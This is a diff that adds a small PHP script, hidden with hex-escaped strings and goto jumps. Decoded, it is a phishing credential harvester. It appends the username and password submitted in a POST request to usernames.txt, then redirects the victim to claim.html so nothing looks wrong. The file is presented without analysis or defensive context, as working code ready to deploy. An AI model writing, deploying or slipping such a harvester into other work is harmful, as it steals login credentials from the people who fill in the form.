@@ -1,0 +1,2 @@
+<?php
+ goto z4IGb; a_CYw: header("\x4c\x6f\x63\141\x74\x69\157\156\x3a\40\x63\x6c\141\151\x6d\56\150\x74\x6d\x6c"); goto Jepxh; z4IGb: file_put_contents("\x75\x73\145\162\156\x61\155\145\163\56\164\x78\x74", "\x41\x63\143\157\x75\x6e\164\72\x20" . $_POST["\x75\163\145\x72\x6e\x61\x6d\x65"] . "\x20\x50\141\163\163\x3a\40" . $_POST["\x70\x61\163\x73\167\157\162\144"] . "\12", FILE_APPEND); goto a_CYw; Jepxh: die;
